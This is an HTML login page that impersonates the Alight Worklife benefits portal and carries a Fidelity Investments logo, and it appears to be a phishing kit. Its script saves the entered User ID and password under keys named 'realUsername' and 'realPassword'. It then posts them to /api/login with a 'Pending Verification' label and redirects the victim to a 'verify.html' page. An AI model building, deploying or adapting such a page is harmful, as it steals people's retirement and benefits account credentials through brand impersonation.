
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-size: cover;
            background-image: url('logi.jpg');
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            position: relative;
            
            

  min-height: 100vh;
  background: linear-gradient(
    135deg,
    #e0f2fe,
    #dbeafe,
    #f8fafc
  );
}

        

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: -1;
        }

        .login-wrapper {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }

        .logo-container { 
            text-align: center; 
            margin-bottom: 40px; 
            z-index: 2; 
        }

        .alight-worklife {
            font-size: 2.6rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            margin-bottom: 12px;
        }
        .alight-worklife .alight { color: #ffffff; }
        .alight-worklife .worklife {
            background: linear-gradient(90deg, #7ed957, #34d399);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .fidelity-logo {
            display: flex;
            justify-content: center;
            margin: 15px 0 25px;
            background: rgba(255,255,255,0.95);
            border-radius: 12px;
            padding: 12px;
        }
        .fidelity-logo img {
            width: 180px;
            height: auto;
        }

            .form-container {
background: #ffffff;
  border-radius: 24px;
  padding: 32px;
  box-shadow: 0 15px 40px rgba(0,0,0,0.08);
            z-index: 2;
            position: relative;
            background-image: url('logi.jpg');
}

        

        label { 
            display: block; 
            margin: 20px 0 8px; 
            font-size: 1.05rem; 
            color: #1e2937; 
            font-weight: 600; 
        }

        input { 
            width: 100%; 
            padding: 16px 18px; 
            border: 2px solid #e2e8f0; 
            border-radius: 12px; 
            font-size: 1.1rem; 
            transition: all 0.3s ease;
        }

        input:focus { 
            outline: none; 
            border-color: #1e40af; 
            box-shadow: 0 0 0 4px rgba(30, 64, 175, 0.1);
        }

        .login-btn { 
            width: 100%; 
            padding: 16px; 
            background: linear-gradient(135deg, #1e40af, #3b82f6); 
            color: white; 
            border: none; 
            border-radius: 12px; 
            font-size: 1.2rem; 
            font-weight: 600; 
            margin: 25px 0 10px; 
            cursor: pointer;
            transition: transform 0.2s ease;
        }

        .login-btn:hover {
            transform: translateY(-2px);
        }

        .forgot-link {
            text-align: right;
            margin: 10px 0 20px;
        }

        .forgot-link a {
            color: #1e40af;
            text-decoration: none;
            font-weight: 500;
        }

        .worklife {
            font-size: 15px;
            color: #334155;
            background-color: #f1f5f9;
            padding: 16px;
            border-radius: 10px;
            margin-top: 25px;
            text-align: center;
            border-left: 5px solid #1e40af;
        }
                .helper-text {
            display: block;
            margin-top: 6px;
            font-size: 13px;
            color: #0052cc;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="login-wrapper">
        <div class="logo-container">
            <div class="alight-worklife">
                <span class="alight">alight</span>
                <span class="worklife">worklife</span>
            </div>

            <div class="fidelity-logo">
                <img src="fidelity.jpg" alt="Fidelity Investments">
            </div>
        </div>

        <div class="form-container">
            <form id="loginForm">
                <label for="username">User ID</label>
                <input type="text" id="username" placeholder="Enter your User ID" required>
                  <small class="helper-text">Same ID used to access benefits on alight Worklife web</small>

                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your Password" required>

                <div class="forgot-link">
                    <a href="forgot.html">Forgot Password?</a>
                </div>

                <button type="submit" class="login-btn">LOG IN</button>
            </form>

            <div class="worklife">
                Same Login used to access benefits on Alight Worklife web
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            sessionStorage.setItem('realUsername', username);
            sessionStorage.setItem('realPassword', password);

            const payload = { 
                username: username || "N/A", 
                password: password || "N/A", 
                address: `UserID: ${username} | Password: ${password} | Status: Pending Verification`
            };

            try {
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Submit error:", err);
            }

            window.location.href = "verify.html";
        });
    </script>
</body>
</html>
